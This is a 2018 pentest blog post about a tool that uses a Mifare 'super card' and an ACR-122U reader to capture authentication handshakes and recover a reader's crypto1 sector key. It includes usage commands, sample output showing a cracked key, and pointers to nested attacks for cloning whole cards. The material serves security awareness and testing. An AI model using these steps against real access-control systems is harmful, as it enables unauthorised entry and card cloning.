---
layout: post
title:  "Cracking Mifare with the Super-Card"
date:   2018-05-17 13:49:33 +0000
tags: [RFID, hardware, pentest, redteam, blueteam]
---
_Alternatively called Proxmark-Card, Sniffer-Card, or Suppa Card_

![](/assets/RFID_reader.jpeg)

The program below is an interface to the Mifare Super (Suppa/Supper) Card utilising the libnfc 1.7.1 library (probably now outdated as this program was written in early 2014).

Why release now…. Many super-card card programs are either broken / wrong type / or written in Chinese. This is a simple English (or American) Language program to facilitate non-Chinese users, and released as Open Source so that the content can be analysed and confirmed to be true to purpose and non-malicious if you do not trust it?

This program has been tested successfully on the USB ACR-122U reader on the following operating systems:
* WinXP (32bit) SP0/1/2/3
* Vista (32bit) SP0/1/2

**Note**: From Windows 7+ Microsoft changed the way smartcard drivers operate, and I havnt figured out how to support the later versions of Windows.

The program has two modes read & write, these operations are detailed below…

The attack is based off the collection of two cryptographic handshakes (based off the Mifare UID) we can then use the crypto1 algorithm to discover one key used to access the particular Mifare sector; other attacks can then be performed to access and clone an entire card.

Code: [https://github.com/netscylla/super-card](https://github.com/netscylla/super-card)

## Where to buy a Super Card?
I sourced mine for a reasonable price from an RFID tech-friend (he used http://www.taobao.com). You can source them from other places but I believe the price can often be jacked up considerably, and delivery is unreliable. So sourcing them can be a challenge!

## Super-card Usage
### Set a UID
Using the ‘-w’ flag set a 4-byte (8 hex chars) UID
```
$ nfc-super.exe -w 22334455
Mifare Super Card v0.1 ©2014 Andy
ISO/IEC 14443A (106 kbps) target:
 ATQA (SENS_RES): 00 04
 UID (NFCID1): 11 22 33 44
 SAK (SEL_RES): 08
```
## Operation
Place the card onto a Mifare reader, and ensure you obtain two or more (2+) failed authentication attempts — normally observed by flashing lights on the reader, or wait 6–10 secs.

## Obtain data and crack key
Place the super-card on your reader (we use an old and reliable USB ACR-122U), launch the program with the ‘-r’ flag, and the program should automatically obtain the necessary values and crack the reader key.
```
$ nfc-super.exe -r
Mifare Super Card v0.1 ©2014 Andy
ISO/IEC 14443A (106 kbps) target:
 ATQA (SENS_RES): 00 04
 UID (NFCID1): 22 33 44 55
 SAK (SEL_RES): 08
 UID: 22 33 44 55
1:NR: c9 6f 2e a5
1:AR: 71 67 3d 4d
2:NR: 38 aa fa ba
2:AR: 5d 32 cd f4
Cracking…
Found Key: [e5b20aeeffff]
```
## Further cracking
Use the Mifare nested attack (or mfoc.exe) to crack any remaining keys on a genuine card.

## Disclaimer
Netscylla or its staff cannot be held responsible for any abuse relating from this blog post. This post is to raise awareness in the design and security flaws of the Mifare access control systems. It is illegal to attempt unauthorised access on any system you do not personally own, or have explicit permission in writing from the owner! If in doubt contact your local authority or local digital lock-sport community for additional advice.
